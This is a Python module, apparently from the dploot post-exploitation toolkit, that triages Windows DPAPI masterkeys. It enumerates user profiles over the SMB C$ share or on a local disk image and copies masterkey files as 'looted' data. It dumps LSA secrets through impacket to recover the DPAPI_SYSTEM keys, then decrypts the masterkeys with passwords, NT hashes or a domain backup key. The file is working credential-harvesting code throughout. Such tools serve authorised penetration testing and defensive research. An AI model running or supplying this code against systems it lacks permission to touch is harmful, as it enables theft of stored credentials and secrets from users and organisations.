from binascii import hexlify, unhexlify
import argparse
import logging
import ntpath
import os
from typing import Dict, List
from Cryptodome.Hash import SHA1

from impacket.examples.secretsdump import LSASecrets

from dploot.lib.dpapi import decrypt_masterkey
from dploot.lib.target import Target
from dploot.lib.utils import find_guid, find_sha1, is_guid, parse_file_as_list
from dploot.lib.smb import DPLootSMBConnection

class Masterkey:
    def __init__(self, guid, sha1, user: str = 'None') -> None:
        self.guid = guid
        self.sha1 = sha1
        self.user = user

    def __str__(self) -> str:
        return "{%s}:%s" % (self.guid,self.sha1)

    def dump(self) -> None:
        print(self)

def parse_masterkey_file(filename) -> List[Masterkey]:
    masterkeys = list()
    masterkeys_lines = parse_file_as_list(filename)
    for masterkey in masterkeys_lines:
        guid, sha1 = masterkey.split(':',1)
        masterkeys.append(Masterkey(
            guid=find_guid(guid),
            sha1=find_sha1(sha1),
        ))
    return masterkeys

class MasterkeysTriage:

    false_positive = ['.','..', 'desktop.ini','Public','Default','Default User','All Users']
    user_masterkeys_generic_path = 'AppData\\Roaming\\Microsoft\\Protect'
    system_masterkeys_generic_path = 'Windows\\System32\\Microsoft\\Protect'
    share = 'C$'

    def __init__(self, target: Target, conn: DPLootSMBConnection, pvkbytes: bytes = None, passwords: Dict[str,str] = None, nthashes: Dict[str,str] = None, dpapiSystem: Dict[str,str] = None) -> None:
        self.target = target
        self.conn = conn
        self.pvkbytes = pvkbytes
        self.passwords = passwords
        self.nthashes = nthashes

        self._users = None
        self.looted_files = dict()
        self.dpapiSystem = dpapiSystem
        if self.dpapiSystem is None:
            self.dpapiSystem = {}
        # should be {"MachineKey":"key","Userkey":"key"}

    def _extract_masterkeys_from_files(self, root:str, files:List[str], user:str, sid:str = None) -> List[Masterkey]:
        result = list()
        for guid in filter(is_guid, files):
            filepath=os.path.join(root,guid)
            logging.debug(f"Found {user} MasterKey: {filepath}")
            # read masterkey
            with open(filepath, 'rb') as masterkey_file:
                masterkey_bytes = masterkey_file.read()
            if masterkey_bytes is None: continue
            
            self.looted_files[guid] = masterkey_bytes
            
            if user == 'SYSTEM_User':
                key = decrypt_masterkey(masterkey=masterkey_bytes, dpapi_systemkey=self.dpapiSystem, sid=sid)
            else:
                key = decrypt_masterkey(masterkey=masterkey_bytes, dpapi_systemkey=self.dpapiSystem)
            if key is not None:
                result.append(Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user=user))

        return result
        
    def triage_system_masterkeys(self) -> List[Masterkey]:
        masterkeys = list()
        logging.getLogger("impacket").disabled = True
        if len(self.dpapiSystem) == 0:
            if self.conn.local_session:
                self.conn.enable_localops(os.path.join(self.target.local_root, r'Windows/System32/config/SYSTEM'))
            else:
                self.conn.enable_remoteops()
            if self.conn.remote_ops and self.conn.bootkey:

                SECURITYFileName = self.conn.remote_ops.saveSECURITY()
                LSA = LSASecrets(SECURITYFileName, self.conn.bootkey, self.conn.remote_ops, isRemote=True,
                                perSecretCallback=self.getDPAPI_SYSTEM)
                LSA.dumpSecrets()
                LSA.finish()
            if self.conn.local_ops and self.conn.bootkey:
                logging.debug(f"Boot Key: {hexlify(self.conn.bootkey)}")
                SECURITYFileName = os.path.join(self.target.local_root, r'Windows/System32/config/SECURITY')
                LSA = LSASecrets(SECURITYFileName, self.conn.bootkey, self.conn.remote_ops, isRemote=False,
                                perSecretCallback=self.getDPAPI_SYSTEM)
                LSA.dumpSecrets()
                LSA.finish()

        if self.conn.local_session:
            parse_user_dir = False
            local_system_masterkeys_generic_path=self.system_masterkeys_generic_path.replace('\\', os.sep)
            for root, dirs, files in os.walk(os.path.join(self.target.local_root, local_system_masterkeys_generic_path)):
                path = root.split(os.sep)
                root_basename = os.path.basename(root)
                if root_basename not in self.false_positive and root_basename[:2] == 'S-' :
                    sid=root_basename 
                    system_protect_dir_sid_path=root
                    masterkeys.extend(self._extract_masterkeys_from_files(root,files,'SYSTEM',sid))
                    for dir in dirs:
                        if dir == 'User':
                            parse_user_dir = True
                if root_basename == 'User' and parse_user_dir:
                    parse_user_dir = False
                    masterkeys.extend(self._extract_masterkeys_from_files(root,files,'SYSTEM_User',sid))
        else:
            system_protect_dir = self.conn.remote_list_dir(self.share, path=self.system_masterkeys_generic_path)
            for d in system_protect_dir:
                if d not in self.false_positive and d.is_directory()>0 and d.get_longname()[:2] == 'S-':# could be a better way to deal with sid
                    sid = d.get_longname()
                    system_protect_dir_sid_path = ntpath.join(self.system_masterkeys_generic_path,sid)
                    system_sid_dir = self.conn.remote_list_dir(self.share, path=system_protect_dir_sid_path)
                    for f in system_sid_dir:
                        if f.is_directory() == 0 and is_guid(f.get_longname()):
                            guid = f.get_longname()
                            filepath = ntpath.join(system_protect_dir_sid_path,guid)
                            logging.debug("Found SYSTEM system MasterKey: \\\\%s\\%s\\%s" %  (self.target.address,self.share,filepath))
                            # read masterkey
                            masterkey_bytes = self.conn.readFile(self.share, filepath)
                            if masterkey_bytes is not None:
                                self.looted_files[guid] = masterkey_bytes
                                key = decrypt_masterkey(masterkey=masterkey_bytes, dpapi_systemkey=self.dpapiSystem)
                                if key is not None:
                                    masterkeys.append(Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user='SYSTEM'))
                        elif f.is_directory()>0 and f.get_longname() == 'User':
                            system_protect_dir_user_path = ntpath.join(system_protect_dir_sid_path,'User')
                            system_user_dir = self.conn.remote_list_dir(self.share, path=system_protect_dir_user_path)
                            for g in system_user_dir:
                                if g.is_directory() == 0 and is_guid(g.get_longname()):
                                    guid = g.get_longname()
                                    filepath = ntpath.join(system_protect_dir_user_path,guid)
                                    logging.debug("Found SYSTEM user MasterKey: \\\\%s\\%s\\%s" %  (self.target.address,self.share,filepath))
                                    # read masterkey
                                    masterkey_bytes = self.conn.readFile(self.share, filepath)
                                    if masterkey_bytes is not None:
                                        self.looted_files[guid] = masterkey_bytes
                                        key = decrypt_masterkey(masterkey=masterkey_bytes, dpapi_systemkey=self.dpapiSystem, sid=sid)
                                        if key is not None:
                                            masterkeys.append(Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user='SYSTEM_User'))
        return masterkeys

    def triage_masterkeys(self) -> List[Masterkey]:
        masterkeys = list()
        for user in self.users:
            try:
                masterkeys += self.triage_masterkeys_for_user(user)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                    logging.debug(str(e))
        return masterkeys
            
    def triage_masterkeys_for_user(self, user:str) -> List[Masterkey]:
        masterkeys = list()
        user_masterkey_path = ntpath.join(ntpath.join('Users', user),self.user_masterkeys_generic_path)
        user_protect_dir = self.conn.remote_list_dir(self.share, path=user_masterkey_path)
        if user_protect_dir is None: # Yes, it's possible that users have an AppData tree but no Protect folder
            return masterkeys
        for d in user_protect_dir:
            if d not in self.false_positive and d.is_directory()>0 and d.get_longname()[:2] == 'S-':# could be a better way to deal with sid
                sid = d.get_longname()
                user_masterkey_path_sid = ntpath.join(ntpath.join(ntpath.join('Users', user),self.user_masterkeys_generic_path),sid)
                user_sid_dir = self.conn.remote_list_dir(self.share, path=user_masterkey_path_sid)
                for f in user_sid_dir: 
                    if f.is_directory() == 0 and is_guid(f.get_longname()):
                        guid = f.get_longname()
                        filepath = ntpath.join(user_masterkey_path_sid,guid)
                        logging.debug("Found MasterKey: \\\\%s\\%s\\%s" %  (self.target.address,self.share,filepath))
                        # read masterkey
                        masterkey_bytes = self.conn.readFile(self.share, filepath)
                        if masterkey_bytes is not None:
                            self.looted_files[guid] = masterkey_bytes
                            password = None
                            nthash = None
                            if self.passwords is not None and user.lower() in self.passwords:
                                password = self.passwords[user.lower()]
                            elif self.passwords is not None and user.rpartition('.')[0].lower() in self.passwords:
                                password = self.passwords[user.rpartition('.')[0].lower()] # In case of duplicate (like admin and admin.waza) on usernames in c:\Users\
                            if self.nthashes is not None and user.lower() in self.nthashes:
                                nthash = self.nthashes[user.lower()]
                            elif self.nthashes is not None and user.rpartition('.')[0].lower() in self.nthashes:
                                nthash = self.nthashes[user.rpartition('.')[0].lower()]
                            key = decrypt_masterkey(
                                masterkey=masterkey_bytes,
                                domain_backupkey=self.pvkbytes,
                                sid=sid, 
                                password=password,
                                nthash=nthash,
                                )
                            if key is not None:
                                masterkeys.append(Masterkey(guid=guid, sha1=hexlify(SHA1.new(key).digest()).decode('latin-1'), user=user))
        return masterkeys

    def getDPAPI_SYSTEM(self,_, secret) -> None:
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split('\n')
            machineKey = machineKey.split(':')[1]
            userKey = userKey.split(':')[1]
            self.dpapiSystem['MachineKey'] = unhexlify(machineKey[2:])
            self.dpapiSystem['UserKey'] = unhexlify(userKey[2:])

    @property
    def users(self) -> List[str]:
        if self._users is not None:
            return self._users
        
        users = list()

        users_dir_path = 'Users\\*'
        directories = self.conn.listPath(shareName='C$', path=ntpath.normpath(users_dir_path))
        for d in directories:
            if d.get_longname() not in self.false_positive and d.is_directory() > 0:
                users.append(d.get_longname())
    
        self._users = users

        return self._users